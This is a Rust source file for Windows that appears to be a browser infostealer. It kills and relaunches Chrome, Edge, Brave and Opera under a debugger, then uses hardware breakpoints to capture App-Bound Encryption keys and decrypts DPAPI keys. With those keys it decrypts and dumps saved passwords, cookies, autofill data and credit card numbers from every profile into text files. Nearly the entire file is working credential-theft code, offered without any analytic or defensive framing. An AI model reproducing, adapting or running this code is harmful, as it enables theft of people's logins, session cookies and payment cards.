#![allow(non_snake_case)]

use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::System::Diagnostics::Debug::*;
use windows_sys::Win32::Storage::FileSystem::*;
use windows_sys::Win32::Security::*;
use windows_sys::Win32::Security::Cryptography::*;
use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
use std::ptr::{null, null_mut};
use std::mem::{size_of, zeroed};
use std::path::{Path, PathBuf};
use std::fs;
use std::io::Write;
use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
use rusqlite::{Connection};
use chrono::{Utc};

struct BrowserConfig {
    name: &'static str,
    process_name: &'static str,
    exe_paths: &'static [&'static str],
    dll_name: &'static str,
    user_data_subdir: &'static [&'static str],
    output_dir: &'static str,
    temp_prefix: &'static str,
    use_r14: bool,
    use_roaming: bool,
    has_abe: bool,
}
#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_DOS_HEADER {
    pub e_magic: u16,
    pub e_cblp: u16,
    pub e_cp: u16,
    pub e_crlc: u16,
    pub e_cparhdr: u16,
    pub e_minalloc: u16,
    pub e_maxalloc: u16,
    pub e_ss: u16,
    pub e_sp: u16,
    pub e_csum: u16,
    pub e_ip: u16,
    pub e_cs: u16,
    pub e_lfarlc: u16,
    pub e_ovno: u16,
    pub e_res: [u16; 4],
    pub e_oemid: u16,
    pub e_oeminfo: u16,
    pub e_res2: [u16; 10],
    pub e_lfanew: i32,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_SECTION_HEADER {
    pub Name: [u8; 8],
    pub Misc: IMAGE_SECTION_HEADER_0,
    pub VirtualAddress: u32,
    pub SizeOfRawData: u32,
    pub PointerToRawData: u32,
    pub PointerToRelocations: u32,
    pub PointerToLinenumbers: u32,
    pub NumberOfRelocations: u16,
    pub NumberOfLinenumbers: u16,
    pub Characteristics: u32,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub union IMAGE_SECTION_HEADER_0 {
    pub PhysicalAddress: u32,
    pub VirtualSize: u32,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_FILE_HEADER {
    pub Machine: u16,
    pub NumberOfSections: u16,
    pub TimeDateStamp: u32,
    pub PointerToSymbolTable: u32,
    pub NumberOfSymbols: u32,
    pub SizeOfOptionalHeader: u16,
    pub Characteristics: u16,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_DATA_DIRECTORY {
    pub VirtualAddress: u32,
    pub Size: u32,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_OPTIONAL_HEADER64 {
    pub Magic: u16,
    pub MajorLinkerVersion: u8,
    pub MinorLinkerVersion: u8,
    pub SizeOfCode: u32,
    pub SizeOfInitializedData: u32,
    pub SizeOfUninitializedData: u32,
    pub AddressOfEntryPoint: u32,
    pub BaseOfCode: u32,
    pub ImageBase: u64,
    pub SectionAlignment: u32,
    pub FileAlignment: u32,
    pub MajorOperatingSystemVersion: u16,
    pub MinorOperatingSystemVersion: u16,
    pub MajorImageVersion: u16,
    pub MinorImageVersion: u16,
    pub MajorSubsystemVersion: u16,
    pub MinorSubsystemVersion: u16,
    pub Win32VersionValue: u32,
    pub SizeOfImage: u32,
    pub SizeOfHeaders: u32,
    pub CheckSum: u32,
    pub Subsystem: u16,
    pub DllCharacteristics: u16,
    pub SizeOfStackReserve: u64,
    pub SizeOfStackCommit: u64,
    pub SizeOfHeapReserve: u64,
    pub SizeOfHeapCommit: u64,
    pub LoaderFlags: u32,
    pub NumberOfRvaAndSizes: u32,
    pub DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_NT_HEADERS64 {
    pub Signature: u32,
    pub FileHeader: IMAGE_FILE_HEADER,
    pub OptionalHeader: IMAGE_OPTIONAL_HEADER64,
}

// X64 Context
#[repr(C)]
#[cfg(target_arch = "x86_64")]
#[derive(Copy, Clone)]
pub struct CONTEXT {
    pub P1Home: u64,
    pub P2Home: u64,
    pub P3Home: u64,
    pub P4Home: u64,
    pub P5Home: u64,
    pub P6Home: u64,
    pub ContextFlags: u32,
    pub MxCsr: u32,
    pub SegCs: u16,
    pub SegDs: u16,
    pub SegEs: u16,
    pub SegFs: u16,
    pub SegGs: u16,
    pub SegSs: u16,
    pub EFlags: u32,
    pub Dr0: u64,
    pub Dr1: u64,
    pub Dr2: u64,
    pub Dr3: u64,
    pub Dr6: u64,
    pub Dr7: u64,
    pub Rax: u64,
    pub Rcx: u64,
    pub Rdx: u64,
    pub Rbx: u64,
    pub Rsp: u64,
    pub Rbp: u64,
    pub Rsi: u64,
    pub Rdi: u64,
    pub R8: u64,
    pub R9: u64,
    pub R10: u64,
    pub R11: u64,
    pub R12: u64,
    pub R13: u64,
    pub R14: u64,
    pub R15: u64,
    pub Rip: u64,
    pub Anonymous: CONTEXT_0,
    pub VectorRegister: [M128A; 26],
    pub VectorControl: u64,
    pub DebugControl: u64,
    pub LastBranchToRip: u64,
    pub LastBranchFromRip: u64,
    pub LastExceptionToRip: u64,
    pub LastExceptionFromRip: u64,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub union CONTEXT_0 {
    pub FltSave: XSAVE_FORMAT,
    pub Anonymous: CONTEXT_0_0,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct CONTEXT_0_0 {
    pub Header: [M128A; 2],
    pub Legacy: [M128A; 8],
    pub Xmm0: M128A,
    pub Xmm1: M128A,
    pub Xmm2: M128A,
    pub Xmm3: M128A,
    pub Xmm4: M128A,
    pub Xmm5: M128A,
    pub Xmm6: M128A,
    pub Xmm7: M128A,
    pub Xmm8: M128A,
    pub Xmm9: M128A,
    pub Xmm10: M128A,
    pub Xmm11: M128A,
    pub Xmm12: M128A,
    pub Xmm13: M128A,
    pub Xmm14: M128A,
    pub Xmm15: M128A,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct M128A {
    pub Low: u64,
    pub High: i64,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct XSAVE_FORMAT {
    pub ControlWord: u16,
    pub StatusWord: u16,
    pub TagWord: u8,
    pub Reserved1: u8,
    pub ErrorOpcode: u16,
    pub ErrorOffset: u32,
    pub ErrorSelector: u16,
    pub Reserved2: u16,
    pub DataOffset: u32,
    pub DataSelector: u16,
    pub Reserved3: u16,
    pub MxCsr: u32,
    pub MxCsr_Mask: u32,
    pub FloatRegisters: [M128A; 8],
    pub XmmRegisters: [M128A; 16],
    pub Reserved4: [u8; 96],
}

pub const CONTEXT_AMD64: u32 = 0x00100000;
pub const CONTEXT_CONTROL: u32 = CONTEXT_AMD64 | 0x00000001;
pub const CONTEXT_INTEGER: u32 = CONTEXT_AMD64 | 0x00000002;
pub const CONTEXT_SEGMENTS: u32 = CONTEXT_AMD64 | 0x00000004;
pub const CONTEXT_FLOATING_POINT: u32 = CONTEXT_AMD64 | 0x00000008;
pub const CONTEXT_DEBUG_REGISTERS: u32 = CONTEXT_AMD64 | 0x00000010;
pub const CONTEXT_FULL: u32 = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS;

#[link(name = "kernel32")]
extern "system" {
    pub fn CreateProcessW(
        lpapplicationname: *const u16,
        lpcommandline: *mut u16,
        lpprocessattributes: *const SECURITY_ATTRIBUTES,
        lpthreadattributes: *const SECURITY_ATTRIBUTES,
        binherithandles: BOOL,
        dwcreationflags: PROCESS_CREATION_FLAGS,
        lpenvironment: *const std::ffi::c_void,
        lpcurrentdirectory: *const u16,
        lpstartupinfo: *const STARTUPINFOW,
        lpprocessinformation: *mut PROCESS_INFORMATION,
    ) -> BOOL;
    pub fn GetThreadContext(hthread: HANDLE, lpcontext: *mut CONTEXT) -> BOOL;
    pub fn SetThreadContext(hthread: HANDLE, lpcontext: *const CONTEXT) -> BOOL;
}

fn main() {
    let configs = vec![
        BrowserConfig {
            name: "Google Chrome",
            process_name: "chrome.exe",
            exe_paths: &[
                "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
            ],
            dll_name: "chrome.dll",
            user_data_subdir: &["Google", "Chrome", "User Data"],
            output_dir: "chrome_extract",
            temp_prefix: "chrome_tmp",
            use_r14: false,
            use_roaming: false,
            has_abe: true,
        },
        BrowserConfig {
            name: "Microsoft Edge",
            process_name: "msedge.exe",
            exe_paths: &[
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
            ],
            dll_name: "msedge.dll",
            user_data_subdir: &["Microsoft", "Edge", "User Data"],
            output_dir: "edge_extract",
            temp_prefix: "edge_tmp",
            use_r14: true,
            use_roaming: false,
            has_abe: true,
        },
        BrowserConfig {
            name: "Brave",
            process_name: "brave.exe",
            exe_paths: &[
                "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
            ],
            dll_name: "chrome.dll",
            user_data_subdir: &["BraveSoftware", "Brave-Browser", "User Data"],
            output_dir: "brave_extract",
            temp_prefix: "brave_tmp",
            use_r14: false,
            use_roaming: false,
            has_abe: true,
        },
        BrowserConfig {
            name: "Opera Stable",
            process_name: "opera.exe",
            exe_paths: &[
				"C:\\Users\\Kemal\\AppData\\Local\\Programs\\Opera\\opera.exe",
                "C:\\Program Files\\Opera\\launcher.exe",
                "C:\\Program Files (x86)\\Opera\\launcher.exe",
            ],
            dll_name: "launcher_lib.dll",
            user_data_subdir: &["Opera Software", "Opera Stable"],
            output_dir: "opera_extract",
            temp_prefix: "opera_tmp",
            use_r14: false,
            use_roaming: true,
            has_abe: false,
        },
        BrowserConfig {
            name: "Opera GX",
            process_name: "opera.exe",
            exe_paths: &[
				"C:\\Users\\Kemal\\AppData\\Local\\Programs\\Opera GX\\opera.exe",
                "C:\\Program Files\\Opera GX\\launcher.exe",
                "C:\\Program Files (x86)\\Opera GX\\launcher.exe",
            ],
            dll_name: "launcher_lib.dll",
            user_data_subdir: &["Opera Software", "Opera GX Stable"],
            output_dir: "operagx_extract",
            temp_prefix: "operagx_tmp",
            use_r14: false,
            use_roaming: true,
            has_abe: false,
        },
    ];

    unsafe {
        kill_processes_by_name("chrome.exe");
        kill_processes_by_name("msedge.exe");
        kill_processes_by_name("brave.exe");
        kill_processes_by_name("opera.exe");
        kill_processes_by_name("launcher.exe");
    }

    for config in configs {
        let user_data_dir = match get_user_data_dir(config.user_data_subdir, config.use_roaming) {
            Some(d) => d,
            None => {
                println!("User data directory not found for {}, skipping...", config.name);
                continue;
            }
        };

        let mut exe_path = None;
        for path in config.exe_paths {
            if Path::new(path).exists() {
                exe_path = Some(*path);
                break;
            }
        }

        let exe_path = match exe_path {
            Some(p) => p,
            None => {
                println!("Executable not found for {}, skipping...", config.name);
                continue;
            }
        };

        println!("Processing {}...", config.name);

        let v10_key_res = get_v10_key(&user_data_dir);
        let mut should_debug = config.has_abe;

        if let Some((key, is_dpapi)) = v10_key_res {
            if is_dpapi && !config.has_abe {
                println!("Found DPAPI key for {}, extracting immediately...", config.name);
                extract_all_profiles_data(None, &config, &user_data_dir);
                should_debug = false;
            } else if !is_dpapi && !config.has_abe {
                // If it's v20 but we didn't expect ABE, it might be a newer Opera or misconfig
                // Try to extract anyway if we got a key
                println!("Found ABE key for {}, extracting immediately...", config.name);
                extract_all_profiles_data(Some(key), &config, &user_data_dir);
                should_debug = false;
            }
        }

        if !should_debug && !config.has_abe {
            continue;
        }

        unsafe {
            let mut si: STARTUPINFOW = zeroed();
            si.cb = size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = zeroed();

            let mut cmd_line: Vec<u16> = format!("\"{}\" --no-first-run --no-default-browser-check\0", exe_path)
                .encode_utf16()
                .collect();

            let success = CreateProcessW(
                null(),
                cmd_line.as_mut_ptr(),
                null(),
                null(),
                FALSE,
                DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE,
                null(),
                null(),
                &si,
                &mut pi,
            );

            if success == 0 {
                eprintln!("Failed to create {} process: {}", config.name, GetLastError());
                continue;
            }

            println!("Started {} with PID: {}", config.name, pi.dwProcessId);

            debug_loop(pi.hProcess, &config, &user_data_dir);

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}

unsafe fn debug_loop(h_process: HANDLE, config: &BrowserConfig, user_data_dir: &Path) {
    let mut debug_event: DEBUG_EVENT = zeroed();
    let mut _dll_base: *mut std::ffi::c_void = null_mut();
    let mut target_address: usize = 0;

    loop {
        if WaitForDebugEvent(&mut debug_event, INFINITE) == 0 {
            break;
        }

        match debug_event.dwDebugEventCode {
            LOAD_DLL_DEBUG_EVENT => {
                let load_dll = debug_event.u.LoadDll;
                let mut buffer = [0u16; 260];
                let len = GetFinalPathNameByHandleW(load_dll.hFile, buffer.as_mut_ptr(), buffer.len() as u32, 0);
                if len > 0 {
                    let path = String::from_utf16_lossy(&buffer[..len as usize]);
                    if path.contains(config.dll_name) {
                        println!("Found {} at {:?}", config.dll_name, load_dll.lpBaseOfDll);
                        _dll_base = load_dll.lpBaseOfDll;
                        target_address = find_target_address(h_process, _dll_base, config.name);
                        if target_address != 0 {
                            let threads = get_all_threads(debug_event.dwProcessId);
                            println!("Setting hardware breakpoints for {} on {} threads", config.name, threads.len());
                            for thread_id in threads {
                                set_hardware_breakpoint(thread_id, target_address);
                            }
                        }
                    }
                }
            }
            CREATE_THREAD_DEBUG_EVENT => {
                if target_address != 0 {
                    set_hardware_breakpoint(debug_event.dwThreadId, target_address);
                }
            }
            EXCEPTION_DEBUG_EVENT => {
                let exception = debug_event.u.Exception;
                if exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP {
                    if exception.ExceptionRecord.ExceptionAddress as usize == target_address {
                        println!("Target breakpoint hit!");
                        if extract_key(debug_event.dwThreadId, h_process, config, user_data_dir) {
                            clear_hardware_breakpoints(debug_event.dwProcessId);
                            TerminateProcess(h_process, 0);
                        }
                    }
                    set_resume_flag(debug_event.dwThreadId);
                }
            }
            EXIT_PROCESS_DEBUG_EVENT => {
                break;
            }
            _ => {}
        }

        ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
    }
}

unsafe fn find_target_address(h_process: HANDLE, base_addr: *mut std::ffi::c_void, browser_name: &str) -> usize {
    let mut dos_header: IMAGE_DOS_HEADER = zeroed();
    let mut bytes_read = 0;
    if ReadProcessMemory(h_process, base_addr, &mut dos_header as *mut _ as *mut _, size_of::<IMAGE_DOS_HEADER>(), &mut bytes_read) == 0 {
        return 0;
    }

    let nt_headers_ptr = (base_addr as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
    let mut nt_headers: IMAGE_NT_HEADERS64 = zeroed();
    if ReadProcessMemory(h_process, nt_headers_ptr as *const _, &mut nt_headers as *mut _ as *mut _, size_of::<IMAGE_NT_HEADERS64>(), &mut bytes_read) == 0 {
        return 0;
    }

    let section_count = nt_headers.FileHeader.NumberOfSections;
    let mut sections = Vec::with_capacity(section_count as usize);
    let section_header_ptr = (nt_headers_ptr as usize + size_of::<IMAGE_NT_HEADERS64>()) as *mut IMAGE_SECTION_HEADER;

    for i in 0..section_count {
        let mut section: IMAGE_SECTION_HEADER = zeroed();
        ReadProcessMemory(h_process, (section_header_ptr as usize + i as usize * size_of::<IMAGE_SECTION_HEADER>()) as *const _, &mut section as *mut _ as *mut _, size_of::<IMAGE_SECTION_HEADER>(), &mut bytes_read);
        sections.push(section);
    }

    let target_string = "OSCrypt.AppBoundProvider.Decrypt.ResultCode";
    let mut string_va = 0;

    for section in &sections {
        let name = std::str::from_utf8(&section.Name).unwrap_or("").trim_matches('\0');
        if name == ".rdata" {
            let section_data = read_process_memory_chunk(h_process, (base_addr as usize + section.VirtualAddress as usize) as *const _, section.Misc.VirtualSize as usize);
            if let Some(pos) = find_subsequence(&section_data, target_string.as_bytes()) {
                string_va = base_addr as usize + section.VirtualAddress as usize + pos;
                break;
            }
        }
    }

    if string_va == 0 {
        println!("Could not find target string in {}'s .rdata section", browser_name);
        return 0;
    }

    for section in &sections {
        let name = std::str::from_utf8(&section.Name).unwrap_or("").trim_matches('\0');
        if name == ".text" {
            let section_start = base_addr as usize + section.VirtualAddress as usize;
            let section_data = read_process_memory_chunk(h_process, section_start as *const _, section.Misc.VirtualSize as usize);

            let mut pos = 0;
            while pos + 7 <= section_data.len() {
                if section_data[pos..pos+3] == [0x48, 0x8D, 0x0D] {
                    let offset = i32::from_le_bytes(section_data[pos+3..pos+7].try_into().unwrap());
                    let rip = section_start + pos + 7;
                    let target = (rip as i64 + offset as i64) as usize;

                    if target == string_va {
                        println!("Found matching LEA instruction at 0x{:X} for {}", section_start + pos, browser_name);
                        return section_start + pos;
                    }
                }
                pos += 1;
            }
        }
    }

    println!("Could not find matching LEA instruction in {}'s .text section", browser_name);
    0
}

fn read_process_memory_chunk(h_process: HANDLE, addr: *const std::ffi::c_void, size: usize) -> Vec<u8> {
    let mut buffer = vec![0u8; size];
    let mut bytes_read = 0;
    unsafe {
        ReadProcessMemory(h_process, addr, buffer.as_mut_ptr() as *mut _, size, &mut bytes_read);
    }
    buffer
}

fn find_subsequence(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack.windows(needle.len()).position(|window| window == needle)
}

unsafe fn kill_processes_by_name(target_name: &str) {
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snapshot != INVALID_HANDLE_VALUE {
        let mut pe: PROCESSENTRY32W = zeroed();
        pe.dwSize = size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot, &mut pe) != 0 {
            loop {
                let exe_name = String::from_utf16_lossy(&pe.szExeFile);
                let exe_name = exe_name.trim_matches('\0');
                if exe_name.eq_ignore_ascii_case(target_name) {
                    let h_process = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if h_process != 0 {
                        TerminateProcess(h_process, 0);
                        CloseHandle(h_process);
                    }
                }

                if Process32NextW(snapshot, &mut pe) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
    }
}

unsafe fn get_all_threads(process_id: u32) -> Vec<u32> {
    let mut threads = Vec::new();
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snapshot != INVALID_HANDLE_VALUE {
        let mut te: THREADENTRY32 = zeroed();
        te.dwSize = size_of::<THREADENTRY32>() as u32;
        if Thread32First(snapshot, &mut te) != 0 {
            loop {
                if te.th32OwnerProcessID == process_id {
                    threads.push(te.th32ThreadID);
                }
                if Thread32Next(snapshot, &mut te) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
    }
    threads
}

unsafe fn set_resume_flag(thread_id: u32) {
    let h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
    if h_thread == 0 {
        return;
    }

    SuspendThread(h_thread);

    let mut context: CONTEXT = zeroed();
    context.ContextFlags = CONTEXT_CONTROL;
    if GetThreadContext(h_thread, &mut context) != 0 {
        context.EFlags |= 0x10000; // Set RF (Resume Flag)
        SetThreadContext(h_thread, &context);
    }

    ResumeThread(h_thread);
    CloseHandle(h_thread);
}

unsafe fn clear_hardware_breakpoints(process_id: u32) {
    let threads = get_all_threads(process_id);
    for thread_id in threads {
        let h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
        if h_thread != 0 {
            SuspendThread(h_thread);
            let mut context: CONTEXT = zeroed();
            context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            if GetThreadContext(h_thread, &mut context) != 0 {
                context.Dr0 = 0;
                context.Dr7 &= !0b11; // Disable DR0
                SetThreadContext(h_thread, &context);
            }
            ResumeThread(h_thread);
            CloseHandle(h_thread);
        }
    }
}

unsafe fn set_hardware_breakpoint(thread_id: u32, address: usize) {
    let h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
    if h_thread == 0 {
        return;
    }

    SuspendThread(h_thread);

    let mut context: CONTEXT = zeroed();
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if GetThreadContext(h_thread, &mut context) != 0 {
        context.Dr0 = address as u64;
        context.Dr7 = (context.Dr7 & !0b11) | 0b01; // Enable DR0 local
        SetThreadContext(h_thread, &context);
    }

    ResumeThread(h_thread);
    CloseHandle(h_thread);
}

fn get_v10_key(user_data_dir: &Path) -> Option<([u8; 32], bool)> {
    let local_state_path = user_data_dir.join("Local State");
    let content = fs::read_to_string(&local_state_path).ok()?;
    let json: serde_json::Value = serde_json::from_str(&content).ok()?;
    let encrypted_key_b64 = json["os_crypt"]["encrypted_key"].as_str()?;
    let encrypted_key = base64_decode(encrypted_key_b64)?;

    let is_dpapi = encrypted_key.starts_with(b"DPAPI");

    let encrypted_blob = if is_dpapi {
        &encrypted_key[5..]
    } else {
        &encrypted_key
    };
    let mut input = CRYPT_INTEGER_BLOB {
        cbData: encrypted_blob.len() as u32,
        pbData: encrypted_blob.as_ptr() as *mut _,
    };
    let mut output = CRYPT_INTEGER_BLOB {
        cbData: 0,
        pbData: null_mut(),
    };

    unsafe {
        if CryptUnprotectData(&mut input, null_mut(), null_mut(), null_mut(), null_mut(), 0, &mut output) != 0 {
            let key_slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
            let mut key = [0u8; 32];
            if key_slice.len() == 32 {
                key.copy_from_slice(key_slice);
                LocalFree(output.pbData as *mut _);
                return Some((key, is_dpapi));
            }
            LocalFree(output.pbData as *mut _);
        }
    }
    None
}

fn base64_decode(input: &str) -> Option<Vec<u8>> {
    let input_u16: Vec<u16> = input.encode_utf16().collect();
    let mut out_len: u32 = 0;
    unsafe {
        if CryptStringToBinaryW(input_u16.as_ptr(), input_u16.len() as u32, CRYPT_STRING_BASE64, null_mut(), &mut out_len, null_mut(), null_mut()) != 0 {
            let mut out = vec![0u8; out_len as usize];
            if CryptStringToBinaryW(input_u16.as_ptr(), input_u16.len() as u32, CRYPT_STRING_BASE64, out.as_mut_ptr(), &mut out_len, null_mut(), null_mut()) != 0 {
                return Some(out);
            }
        }
    }
    None
}

fn get_user_data_dir(subdir: &[&str], use_roaming: bool) -> Option<PathBuf> {
    let app_data = if use_roaming {
        std::env::var("APPDATA").ok()?
    } else {
        std::env::var("LOCALAPPDATA").ok()?
    };
    let mut path = PathBuf::from(app_data);
    for component in subdir {
        path.push(component);
    }
    if path.exists() {
        Some(path)
    } else {
        None
    }
}

fn discover_profiles(user_data_dir: &Path) -> Vec<String> {
    let mut profiles = Vec::new();
    if let Ok(entries) = fs::read_dir(user_data_dir) {
        for entry in entries.flatten() {
            if let Ok(file_type) = entry.file_type() {
                if file_type.is_dir() {
                    let profile_path = entry.path();
                    if profile_path.join("Preferences").exists() {
                        if let Some(name) = entry.file_name().to_str() {
                            profiles.push(name.to_string());
                        }
                    }
                }
            }
        }
    }
    profiles
}

fn decrypt_blob(blob: &[u8], v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, is_opera: bool) -> Option<Vec<u8>> {
    if blob.is_empty() {
        return None;
    }

    if blob.starts_with(b"v10") && blob.len() > 15 {
        if let Some(cipher) = v10_cipher {
            let nonce = Nonce::from_slice(&blob[3..15]);
            if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
                if is_opera && dec.len() > 32 {
                    return Some(dec[32..].to_vec());
                }
                return Some(dec);
            }
        }
        if let Some(cipher) = v20_cipher {
            let nonce = Nonce::from_slice(&blob[3..15]);
            if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
                if is_opera && dec.len() > 32 {
                    return Some(dec[32..].to_vec());
                }
                return Some(dec);
            }
        }
    } else if blob.starts_with(b"v20") && blob.len() > 15 {
        if let Some(cipher) = v20_cipher {
            let nonce = Nonce::from_slice(&blob[3..15]);
            if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
                // v20 (App-Bound) has a 32-byte header in the decrypted plaintext
                if dec.len() > 32 {
                    return Some(dec[32..].to_vec());
                }
                return Some(dec);
            }
        }
        if let Some(cipher) = v10_cipher {
            let nonce = Nonce::from_slice(&blob[3..15]);
            if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
                // v20 (App-Bound) has a 32-byte header in the decrypted plaintext
                if dec.len() > 32 {
                    return Some(dec[32..].to_vec());
                }
                return Some(dec);
            }
        }
    } else if blob.len() > 15 {
        // Fallback for some older versions or specific data types that might not have the prefix but use DPAPI directly
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: blob.len() as u32,
            pbData: blob.as_ptr() as *mut _,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: null_mut(),
        };
        unsafe {
            if CryptUnprotectData(&mut input, null_mut(), null_mut(), null_mut(), null_mut(), 0, &mut output) != 0 {
                let dec = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
                LocalFree(output.pbData as *mut _);
                return Some(dec);
            }
        }
    }

    None
}

fn copy_and_open_db(db_path: &Path, prefix: &str) -> Option<(Connection, PathBuf)> {
    let temp_db = std::env::temp_dir().join(format!("{}_{}", prefix, rand::random::<u32>()));
    if let Err(_) = fs::copy(db_path, &temp_db) {
        return None;
    }

    match Connection::open(&temp_db) {
        Ok(conn) => Some((conn, temp_db)),
        Err(_) => {
            let _ = fs::remove_file(&temp_db);
            None
        }
    }
}

fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str, is_opera: bool) {
    let db_path = profile_path.join("Login Data");
    if !db_path.exists() { return; }

    if let Some((conn, temp_path)) = copy_and_open_db(&db_path, temp_prefix) {
        if let Ok(mut stmt) = conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
            let mut file = fs::File::create(output_dir.join("passwords.txt")).unwrap();
            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?))).unwrap();

            for row in rows.flatten() {
                let (url, user, blob) = row;
                if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher, is_opera) {
                    writeln!(file, "URL: {}\nUser: {}\nPass: {}\n---", url, user, String::from_utf8_lossy(&dec)).unwrap();
                }
            }
        }
        let _ = fs::remove_file(temp_path);
    }
}

fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str, is_opera: bool) {
    let mut db_path = profile_path.join("Network").join("Cookies");
    if !db_path.exists() {
        db_path = profile_path.join("Cookies");
    }
    if !db_path.exists() { return; }

    if let Some((conn, temp_path)) = copy_and_open_db(&db_path, temp_prefix) {
        if let Ok(mut stmt) = conn.prepare("SELECT host_key, name, value, encrypted_value FROM cookies") {
            let mut file = fs::File::create(output_dir.join("cookies.txt")).unwrap();
            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, String>(2)?, row.get::<_, Vec<u8>>(3)?))).unwrap();

            for row in rows.flatten() {
                let (host, name, value, blob) = row;
                let decrypted = decrypt_blob(&blob, v10_cipher, v20_cipher, is_opera);

                let cookie_val = if let Some(dec) = decrypted {
                    String::from_utf8_lossy(&dec).to_string()
                } else if !value.is_empty() {
                    value
                } else {
                    String::new()
                };

                if !cookie_val.is_empty() {
                    writeln!(file, "Host: {} | Name: {} | Value: {}", host, name, cookie_val).unwrap();
                }
            }
        }
        let _ = fs::remove_file(temp_path);
    }
}

fn extract_autofill(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str, is_opera: bool) {
    let db_path = profile_path.join("Web Data");
    if !db_path.exists() { return; }

    if let Some((conn, temp_path)) = copy_and_open_db(&db_path, temp_prefix) {
        let mut file = fs::File::create(output_dir.join("autofill.txt")).unwrap();

        // Form History
        if let Ok(mut stmt) = conn.prepare("SELECT name, value FROM autofill") {
            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))).unwrap();
            for row in rows.flatten() {
                writeln!(file, "Form: {} = {}", row.0, row.1).unwrap();
            }
        }

        // Profiles (Modern Schema)
        let tables = vec!["autofill_profile_names", "autofill_profile_emails", "autofill_profile_phones"];
        for table in tables {
            if let Ok(mut stmt) = conn.prepare(&format!("SELECT guid, {} FROM {}", if table.contains("name") { "first_name" } else if table.contains("email") { "email" } else { "number" }, table)) {
                let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))).unwrap();
                for row in rows.flatten() {
                    writeln!(file, "{} ({}): {}", table, row.0, row.1).unwrap();
                }
            }
        }

        // Credit Cards
        if let Ok(mut stmt) = conn.prepare("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards") {
            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, i32>(1)?, row.get::<_, i32>(2)?, row.get::<_, Vec<u8>>(3)?))).unwrap();
            for row in rows.flatten() {
                let (name, m, y, blob) = row;
                if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher, is_opera) {
                    writeln!(file, "Card: {} | Exp: {}/{} | Num: {}", name, m, y, String::from_utf8_lossy(&dec)).unwrap();
                }
            }
        }
        let _ = fs::remove_file(temp_path);
    }
}

